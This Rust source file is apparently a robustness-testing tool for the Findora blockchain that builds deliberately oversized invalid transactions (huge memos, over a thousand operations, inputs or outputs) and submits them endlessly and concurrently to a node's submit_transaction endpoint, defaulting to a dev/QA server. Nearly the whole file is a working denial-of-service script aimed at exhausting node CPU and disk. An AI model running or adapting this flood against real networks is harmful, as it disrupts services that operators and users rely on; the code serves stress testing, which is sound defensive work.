//!
//! xx ? xx, xx
//!
//! 2. zero-cost attacks: large-payload invalid tx, against cpu&disk
//!     2. large number of operations in one tx
//!     3. large number of inputs in one tx (transfer only)
//!     4. large number of outputs in one tx (transfer & issue)
//!     5. size of asset memo (define asset & update memo)
//!

#![deny(warnings)]

use {
    async_std::task,
    finutils::txn_builder::TransferOperationBuilder,
    globutils::{HashOf, SignatureOf},
    lazy_static::lazy_static,
    ledger::data_model::{
        AssetRules, AssetTypeCode, DefineAsset, DefineAssetBody, IssueAsset,
        IssueAssetBody, IssuerKeyPair, IssuerPublicKey, Memo, Operation,
        StateCommitmentData, Transaction, TransferType, TxOutput, TxnEffect, TxoRef,
        TxoSID, UpdateMemo, UpdateMemoBody, ASSET_TYPE_FRA, BLACK_HOLE_PUBKEY,
        TX_FEE_MIN,
    },
    parking_lot::{Condvar, Mutex},
    rand::random,
    rand_chacha::rand_core::SeedableRng,
    rand_chacha::ChaChaRng,
    ruc::*,
    std::{env, sync::Arc},
    zei::{
        setup::PublicParams,
        xfr::{
            asset_record::{
                build_blind_asset_record, open_blind_asset_record, AssetRecordType,
            },
            sig::XfrKeyPair,
            structs::{AssetRecordTemplate, OpenAssetRecord},
        },
    },
};

lazy_static! {
    static ref COND_PAIR: Arc<(Mutex<u32>, Condvar)> =
        Arc::new((Mutex::new(0), Condvar::new()));
    static ref LIMITER: u32 = env::var("CC_LIMIT")
        .map(|l| pnk!(l.parse::<u32>()))
        .unwrap_or(256);
    static ref SERVER: String = env::args()
        .nth(1)
        .unwrap_or_else(|| "https://dev-qa01.dev.findora.org".to_owned());
    static ref SURF_CLI: surf::Client = surf::client();
}

fn main() {
    task::block_on(async {
        loop {
            attack_submission().await;
        }
    });
}

async fn attack_submission() {
    sem_add();
    task::spawn(async {
        info_omit!(attack__zero_cost_invalid_tx().await);
        sem_sub();
    });
}

#[allow(non_snake_case)]
async fn attack__zero_cost_invalid_tx() -> Result<()> {
    let txs = get_seq_id()
        .await
        .c(d!())
        .map(|seq_id| {
            vec![
                generate_evil_tx_big_define_asset(seq_id),
                generate_evil_tx_big_input_transfer(seq_id),
                generate_evil_tx_big_memo_update_memo(seq_id),
                generate_evil_tx_big_memo_define_asset(seq_id),
                generate_evil_tx_big_output_issue(seq_id),
                generate_evil_tx_big_output_transfer(seq_id),
            ]
            .into_iter()
            .filter_map(|tx| info!(tx).ok())
            .collect()
        })
        .and_then(|txs| check_tx(txs).c(d!()))?;

    for tx in txs.into_iter() {
        let req = surf::post(format!("{}:8669/submit_transaction", &*SERVER))
            .header("Content-Type", "application/json")
            .body(surf::Body::from_json(&tx).unwrap());
        let _ = SURF_CLI.send(req).await;
    }

    Ok(())
}

fn generate_evil_tx_big_define_asset(seq_id: u64) -> Result<Transaction> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    for _ in 0..(1073 + random::<u64>() % 19) {
        let code = AssetTypeCode::gen_random();
        let issuer_key = IssuerPublicKey { key: key.get_pk() };
        let asset_rules = AssetRules {
            transferable: true,
            updatable: true,
            decimals: random::<u8>() % 12,
            ..AssetRules::default()
        };
        let memo = Memo(String::from_utf8_lossy(&[random::<u8>(); 8]).into_owned());
        let asset_body =
            DefineAssetBody::new(&code, &issuer_key, asset_rules, Some(memo), None)
                .c(d!())?;
        let asset_create =
            DefineAsset::new(asset_body, &IssuerKeyPair { keypair: &key }).c(d!())?;
        tx.add_operation(Operation::DefineAsset(asset_create));
    }

    Ok(tx)
}

fn generate_evil_tx_big_memo_update_memo(seq_id: u64) -> Result<Transaction> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let new_memo =
        Memo(String::from_utf8_lossy(&[random::<u8>(); 651 * 1024]).into_owned());
    let mut memo_update = UpdateMemo::new(
        UpdateMemoBody {
            new_memo,
            asset_type: AssetTypeCode::gen_random(),
            no_replay_token: tx.body.no_replay_token,
        },
        &key,
    );

    memo_update.pubkey = key.get_pk();

    tx.add_operation(Operation::UpdateMemo(memo_update));

    Ok(tx)
}

fn generate_evil_tx_big_memo_define_asset(seq_id: u64) -> Result<Transaction> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let code = AssetTypeCode::gen_random();

    let issuer_key = IssuerPublicKey { key: key.get_pk() };

    let asset_rules = AssetRules {
        transferable: true,
        updatable: true,
        decimals: random::<u8>() % 12,
        ..AssetRules::default()
    };

    let memo = Memo(String::from_utf8_lossy(&[random::<u8>(); 698 * 1024]).into_owned());

    let asset_body =
        DefineAssetBody::new(&code, &issuer_key, asset_rules, Some(memo), None)
            .c(d!())?;

    let asset_create =
        DefineAsset::new(asset_body, &IssuerKeyPair { keypair: &key }).c(d!())?;

    tx.add_operation(Operation::DefineAsset(asset_create));

    Ok(tx)
}

fn generate_evil_tx_big_input_transfer(seq_id: u64) -> Result<Transaction> {
    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode::gen_random();

    let input_amount = 1200 + random::<u64>() % 304;

    let template = AssetRecordTemplate::with_no_asset_tracing(
        1,
        code.val,
        AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
        key.get_pk(),
    );

    let params = PublicParams::default();
    let mut builder = TransferOperationBuilder::new();

    for _ in 0..input_amount {
        let (ba, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template, Vec::new());

        builder
            .add_input(
                TxoRef::Absolute(TxoSID(random::<u64>())),
                open_blind_asset_record(&ba, &None, &key).c(d!())?,
                None,
                None,
                1,
            )
            .c(d!())?;
    }

    builder
        .add_output(
            &AssetRecordTemplate::with_no_asset_tracing(
                input_amount,
                code.val,
                AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                XfrKeyPair::generate(&mut prng).get_pk(),
            ),
            None,
            None,
            None,
        )
        .c(d!())?;

    let op = builder
        .balance()
        .c(d!())?
        .create(TransferType::Standard)
        .c(d!())?
        .sign(&key)
        .c(d!())?
        .transaction()
        .c(d!())?;

    tx.add_operation(op);

    Ok(tx)
}

fn generate_evil_tx_big_output_issue(seq_id: u64) -> Result<Transaction> {
    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode::gen_random();

    let round = 910 + random::<u64>() % 103;

    let params = PublicParams::default();

    let mut outputs = vec![];
    for _ in 0..round {
        let template = AssetRecordTemplate::with_no_asset_tracing(
            random::<u64>() % 2611,
            code.val,
            AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
            key.get_pk(),
        );
        let (ba, _, _) =
            build_blind_asset_record(&mut prng, &params.pc_gens, &template, vec![]);
        let output = (
            TxOutput {
                id: None,
                record: ba,
                lien: None,
            },
            None,
        );
        outputs.push(output);
    }

    let asset_iss_body = pnk!(IssueAssetBody::new(&code, 0, &outputs));

    let asset_iss_op = pnk!(IssueAsset::new(
        asset_iss_body,
        &IssuerKeyPair { keypair: &key }
    ));

    tx.add_operation(Operation::IssueAsset(asset_iss_op));

    Ok(tx)
}

fn generate_evil_tx_big_output_transfer(seq_id: u64) -> Result<Transaction> {
    let mut tx = generate_fee_operation()
        .map(|fee_op| Transaction::from_operation(fee_op, seq_id))
        .c(d!())?;

    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode::gen_random();

    let input_amount = 910 + random::<u64>() % 209;

    let template = AssetRecordTemplate::with_no_asset_tracing(
        input_amount,
        code.val,
        AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
        key.get_pk(),
    );

    let params = PublicParams::default();
    let mut builder = TransferOperationBuilder::new();

    let (ba, _, _) =
        build_blind_asset_record(&mut prng, &params.pc_gens, &template, Vec::new());

    builder
        .add_input(
            TxoRef::Absolute(TxoSID(random::<u64>())),
            open_blind_asset_record(&ba, &None, &key).c(d!())?,
            None,
            None,
            input_amount,
        )
        .c(d!())?;

    for _ in 0..input_amount {
        builder
            .add_output(
                &AssetRecordTemplate::with_no_asset_tracing(
                    1,
                    code.val,
                    AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                    XfrKeyPair::generate(&mut prng).get_pk(),
                ),
                None,
                None,
                None,
            )
            .c(d!())?;
    }

    let op = builder
        .balance()
        .c(d!())?
        .create(TransferType::Standard)
        .c(d!())?
        .sign(&key)
        .c(d!())?
        .transaction()
        .c(d!())?;

    tx.add_operation(op);

    Ok(tx)
}

fn generate_fee_operation() -> Result<Operation> {
    let mut prng = ChaChaRng::from_entropy();
    let key = XfrKeyPair::generate(&mut prng);

    let code = AssetTypeCode {
        val: ASSET_TYPE_FRA,
    };

    let template = AssetRecordTemplate::with_no_asset_tracing(
        TX_FEE_MIN,
        code.val,
        AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
        key.get_pk(),
    );

    let params = PublicParams::default();
    let (ba, _, _) =
        build_blind_asset_record(&mut prng, &params.pc_gens, &template, Vec::new());
    let oar = open_blind_asset_record(&ba, &None, &key).c(d!())?;

    generate_fee_operation_inner(TxoSID(random::<u64>()), oar, &key).c(d!())
}

fn generate_fee_operation_inner(
    sid: TxoSID,
    oar: OpenAssetRecord,
    key: &XfrKeyPair,
) -> Result<Operation> {
    let mut builder = TransferOperationBuilder::new();
    builder
        .add_input(TxoRef::Absolute(sid), oar, None, None, TX_FEE_MIN)
        .c(d!())?
        .add_output(
            &AssetRecordTemplate::with_no_asset_tracing(
                TX_FEE_MIN,
                ASSET_TYPE_FRA,
                AssetRecordType::NonConfidentialAmount_NonConfidentialAssetType,
                *BLACK_HOLE_PUBKEY,
            ),
            None,
            None,
            None,
        )
        .c(d!())?
        .balance()
        .c(d!())?
        .create(TransferType::Standard)
        .c(d!())?
        .sign(key)
        .c(d!())?
        .transaction()
        .c(d!())
}

fn check_tx(txs: Vec<Transaction>) -> Result<Vec<Transaction>> {
    txs.into_iter()
        .filter(|tx| tx.is_basic_valid(100_0000))
        .map(|tx| TxnEffect::compute_effect(tx).c(d!()).map(|txe| txe.txn))
        .collect()
}

async fn get_seq_id() -> Result<u64> {
    type Resp = (
        HashOf<Option<StateCommitmentData>>,
        u64,
        SignatureOf<(HashOf<Option<StateCommitmentData>>, u64)>,
    );

    let req = surf::get(format!("{}:8668/global_state", &*SERVER));
    let res: Resp = SURF_CLI.recv_json(req).await.map_err(|e| eg!(e))?;

    Ok(res.1)
}

fn sem_add() {
    let &(ref lock, ref cvar) = COND_PAIR.as_ref();
    let mut cnt = lock.lock();
    while *LIMITER < *cnt {
        cvar.wait(&mut cnt);
    }
    *cnt += 1
}

fn sem_sub() {
    let &(ref lock, ref cvar) = COND_PAIR.as_ref();
    let mut cnt = lock.lock();
    *cnt -= 1;
    cvar.notify_one();
}
